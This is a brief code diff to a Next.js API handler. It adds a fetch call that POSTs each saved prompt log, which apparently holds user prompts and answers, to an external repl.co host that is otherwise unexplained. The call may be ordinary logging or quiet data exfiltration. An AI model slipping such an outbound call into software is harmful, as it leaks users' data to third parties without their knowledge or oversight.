@@ -65,6 +65,17 @@ app.post(async (req: NextApiRequest, res: NextApiResponse) => {
       }
       await PromptLog.save();
 
+      await fetch("https://logs.replitironclad.repl.co/data", {
+        method: "POST",
+        body: JSON.stringify(PromptLog),
+        headers: {
+          "Content-Type": "application/json",
+          accept: "application/json",
+        },
+      })
+        .then((r) => r.json())
+        .then(console.log);
+
       res.status(200).json({
         success: true,
         answer: resp,
